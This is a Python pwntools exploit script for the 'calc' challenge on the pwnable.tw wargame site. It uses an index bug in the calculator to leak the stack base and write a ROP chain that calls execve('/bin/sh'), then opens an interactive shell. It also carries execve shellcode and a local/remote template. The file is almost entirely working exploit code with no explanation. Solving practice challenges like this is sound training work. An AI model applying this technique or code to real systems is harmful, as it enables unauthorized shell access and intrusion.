#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

# Interface
local = 1
os_level = 32
binary_name = 'calc'
remote_addr = 'chall.pwnable.tw'
port = 10100

if local:
	p = process(binary_name)
	e = ELF(binary_name)
	# libc = e.libc
else:
	p = remote(remote_addr, port)
	e = ELF(binary_name)
	# libc = ELF("libc-2.23.so")

if os_level == 64:
	context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
	context(log_level='debug', os='linux', arch='i386', bits=32)
else:
	print('Error os!!!')
	exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

def z(a=''):
	if local:
		gdb.attach(p, a)
		if a == '':
			raw_input()
	else:
		pass


ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sla = lambda delim, data: p.sendlineafter(delim, data) 
sa = lambda delim, data: p.sendafter(delim,data)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)

shellcode=asm( 
    """ xor ecx,ecx;
        xor edx,edx ; 
        push edx;
        push 0x68732f6e;
        push 0x69622f2f; 
        mov ebx,esp;
        mov eax,0xb;
        int 0x80 """
)

peax = 0x0805c34b
pedx_ecx_ebx = 0x080701d0
syscall = 0x08049a21
# Main
if __name__ == "__main__":
	payload = b'+'+bytes(str(360),encoding='utf-8')
	sla('===\n',payload)
	ebp = int(p.recvline())
	show(b'ebp--> '+bytes(str(hex(ebp)),encoding='utf-8'))
	bin_sh = ebp
	show(b'bin_sh--> '+bytes(str(hex(bin_sh)),encoding='utf-8'))
	rop=[peax,0x0b,pedx_ecx_ebx,0,0,bin_sh,syscall,u32('/bin'),u32('/sh\0')]
	#gdb.attach(p)
	for i in range(len(rop)):
		payload = b'+'+bytes(str(361+i),encoding='utf-8')
		sl(payload)
		stack = int(rl())
		show(b'stack--> '+str(stack).encode('utf-8'))
		show(b'rop--> '+str(hex(rop[i])).encode('utf-8'))
		diff = rop[i] - stack
		show(b'diff--> '+bytes(str(diff),encoding='utf-8'))
		if diff < 0:
			payload += b'-'
			diff = -diff
		else:
			payload += b'+'
		payload += bytes(str(diff),encoding='utf-8')
		sl(payload)
		rop_stack = int(rl())
		show(b'rop_stack--> '+str(hex(rop_stack)).encode('utf-8'))
	sl(' ')
	p.interactive()